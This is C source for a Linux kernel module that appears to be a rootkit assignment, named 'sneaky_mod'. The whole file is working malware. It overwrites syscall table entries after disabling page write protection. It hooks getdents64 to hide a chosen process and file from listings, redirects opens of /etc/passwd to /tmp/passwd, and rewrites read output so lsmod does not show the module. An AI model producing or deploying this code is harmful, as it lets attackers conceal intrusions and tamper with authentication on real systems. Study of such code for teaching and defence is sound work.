#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>  // for system call constants
#include <linux/dirent.h>
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/moduleparam.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#define PREFIX "sneaky_process"

// This is the parameter to be passed in
static long int pid = 0;
module_param(pid, long, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

//This is a pointer to the system call table
static unsigned long * sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  if (pte->pte & ~_PAGE_RW) {
    pte->pte |= _PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void * ptr) {
  unsigned int level;
  pte_t * pte = lookup_address((unsigned long)ptr, &level);
  pte->pte = pte->pte & ~_PAGE_RW;
  return 0;
}

// #1 Hide from ls
asmlinkage int (*original_getdents64)(struct pt_regs *);

asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
  int total_len = original_getdents64(regs);
  struct linux_dirent64 * direct_arr = (struct linux_dirent64 *)(regs->si);
  int remain_len = total_len;
  char pid_string[512];
  sprintf(pid_string, "%ld", pid);
  while (remain_len > 0) {
    if (strcmp(direct_arr->d_name, "sneaky_process") == 0 ||
        strcmp(direct_arr->d_name, pid_string) == 0) {
      struct linux_dirent64 * dest = (struct linux_dirent64 *)direct_arr;
      struct linux_dirent64 * src =
          (struct linux_dirent64 *)((char *)direct_arr + direct_arr->d_reclen);
      int src_len = remain_len - direct_arr->d_reclen;
      memmove(dest, src, src_len);
      remain_len = src_len;
      continue;
    }
    remain_len -= direct_arr->d_reclen;
    direct_arr = (struct linux_dirent64 *)((char *)direct_arr + direct_arr->d_reclen);
  }
  //printk(KERN_INFO "Into sneaky getdents64");
  return total_len;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).

asmlinkage int (*original_openat)(struct pt_regs *);

//Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
  if (strcmp((char *)(regs->si), "/etc/passwd") == 0) {
    char tmp_file[] = "/tmp/passwd";
    size_t name_len = strlen(tmp_file) + 1;
    char * buffer = kvzalloc(name_len, GFP_KERNEL);
    strcpy(buffer, tmp_file);
    copy_to_user((void __user *)(regs->si), buffer, name_len);
    kvfree(buffer);
  }
  return (*original_openat)(regs);
}

asmlinkage int (*original_read)(struct pt_regs *);

asmlinkage int sneaky_sys_read(struct pt_regs * regs) {
  size_t total_len = (*original_read)(regs);
  if (strstr(current->comm, "lsmod") && strstr((char *)(regs->si), "sneaky_mod")) {
    char * dest = strstr((char *)(regs->si), "sneaky_mod");
    char * line_end = strchr((char *)(regs->si), '\n');
    char * src = line_end + 1;
    size_t remain_len = strlen(src) + 1;
    memmove(dest, src, remain_len);
    total_len = remain_len;
  }
  return total_len;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  printk(KERN_INFO "process id is : %ld\n", pid);
  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.

  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  //sys_call_table[__vfs__read] = (unsigned long)sneaky_sys_read;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");
